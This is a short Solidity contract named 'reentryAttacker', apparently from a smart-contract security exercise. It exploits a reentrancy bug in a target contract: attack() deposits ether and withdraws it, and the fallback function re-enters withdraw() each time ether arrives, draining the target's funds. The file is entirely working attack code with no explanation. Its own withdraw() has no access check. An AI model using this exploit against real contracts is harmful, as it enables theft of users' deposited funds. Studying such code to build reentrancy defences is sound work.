pragma solidity ^0.7.0;

import "./interfaces/Ireentry.sol";

contract reentryAttacker {
    mapping (address => uint) public balanceOf;
    Ireentry public reentryContract;
    address public owner;

    constructor(address _owner, address _reentryContract) public {
        owner = _owner;
        reentryContract = Ireentry(_reentryContract);
    }

    function attack() public payable {
        require(msg.sender == owner);
        reentryContract.deposit{value: msg.value}();
        reentryContract.withdraw(msg.value);
    }

    fallback() external payable {
        reentryContract.withdraw(msg.value);
    }

    function withdraw(uint _value) public {
        owner.call{value: _value}("");
    }
}